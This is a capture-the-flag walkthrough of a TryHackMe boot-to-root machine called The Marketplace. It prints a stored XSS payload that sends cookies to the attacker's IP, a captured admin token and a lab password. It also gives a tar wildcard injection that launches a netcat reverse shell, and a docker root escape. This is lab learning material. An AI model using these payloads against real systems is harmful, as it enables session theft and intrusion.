---
title: Walkthrough - The Marketplace
published: true
---

Tags: Web, XSS, Docker, SQLi.
Description: Boot2root machine for FIT and bsides guatemala CTF.
Difficulty: Easy
URL: [https://tryhackme.com/room/glitch](https://tryhackme.com/room/glitch)

* * *

## Notes

- `sudo nmap -sC -sV -sT -O 10.10.144.85 -oN nmap_2 -p22,80`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
|_  256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)
80/tcp open  http    nginx 1.19.2
|_http-server-header: nginx/1.19.2
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
```

- `gobuster dir -u http://10.10.144.85 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100`

```
/login                (Status: 200) [Size: 857]
/admin                (Status: 403) [Size: 392]
/images               (Status: 301) [Size: 179] [--> /images/]
/Admin                (Status: 403) [Size: 392]               
/Login                (Status: 200) [Size: 857]               
/new                  (Status: 302) [Size: 28] [--> /login]   
/stylesheets          (Status: 301) [Size: 189] [--> /stylesheets/]
/signup               (Status: 200) [Size: 667]                    
/messages             (Status: 302) [Size: 28] [--> /login]        
/ADMIN                (Status: 403) [Size: 392]                    
/New                  (Status: 302) [Size: 28] [--> /login]        
/NEW                  (Status: 302) [Size: 28] [--> /login]        
/Messages             (Status: 302) [Size: 28] [--> /login]        
/Signup               (Status: 200) [Size: 667]                    
/SignUp               (Status: 200) [Size: 667]                    
/LOGIN                (Status: 200) [Size: 857]                   
```

Visiting the website we have a MARKETPLACE wow.

Initially I though I could get XSS sending `<SCRIPT>alert("XSS");//\<</SCRIPT>` through the messages to myselfs created account, but the messages seemed to be parsed and turned to URL safe text. Did however get XSS "adding a new listing" with `<SCRIPT>alert("XSS");//\<</SCRIPT>` then visiting the item `http://10.10.144.85/item/4` 

![0xskar](/assets/the-marketplace01.png)

Also, visiting the pages through burpsuite we can see this is giving us a cookie. Visiting /admin it tells us that we are not authorized to view it. On the listing page there is a Report listing to admins.

Setup listening port on kali linux `nc -nvlkp 6969`

Add a new listing with this xss `<script>document.location='http://10.2.127.225:6969/XSS/grabber.php?c='+document.cookie</script>`

![0xskar](/assets/the-marketplace02.png)

We get our cookie sent through the netcat listner. 

We can then goto `http://10.10.144.5/report/3` to report the listing to the admin.

![0xskar](/assets/the-marketplace03.png)

Boom, we receive the admin cookie!

```
GET /XSS/grabber.php?c=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2NjIxNDM1ODF9.2p7iQfwFvsVpB2ESVvWMkYRzhoFsh0vN1OMIWBYUp6k 
```

Putting this into the firefox inspector lets us access the admin page.

* * * 

## Flag 1

![0xskar](/assets/the-marketplace04.png)

* * * 

## User.txt

- `sqlmap -u http://10.10.144.207/admin?user= --cookie=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsIjI0ODgwMTl9.UNKrJC_3ISOyESabw6njQvthxzjMto0z8Oma0whOsUU -a`

my sqlmap isnt working qq i only get 403 responses...

![0xskar](/assets/the-marketplace05.png)

- `jake:@b_ENXkGYUCAv3zJ`

* * * 

## Root.txt

Now that we're loggin in as jake we run `sudo -l`

```
User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
```

backup.sh contains

```
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

This script calls tar to create a backup file. we do not have write access to it but it is also calling to tar without using the path so if we create a file `tar` inside of backups we should be able to privesc. But this is getting us nowhere. 

After some searching I [found an article on Wildcard Injection](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/). Because this tar is calling a wildcard "`*`" we can use this. An asterisk matches any number of character in a filename, including none. 

```
jake@the-marketplace:/opt/backups$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.2.127.225 6666 >/tmp/f" > shell.sh
jake@the-marketplace:/opt/backups$ echo "" > "--checkpoint-action=exec=sh shell.sh"
jake@the-marketplace:/opt/backups$ echo "" > --checkpoint=1
```

So, creating these files with no name creates files that the astrisk will call to get the tar to execute our shell we created, thus getting us a reverse shell.

```
jake@the-marketplace:/opt/backups$ sudo -u michael /opt/backups/backup.sh 
Backing up files...
tar: backup.tar: file is the archive; not dumped
rm: cannot remove '/tmp/f': No such file or directory
```

and we get a revshell to michael. 

running `id` michael has a docker id. checking gtfo bins and we get a root shell with 

- `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`

* * * 

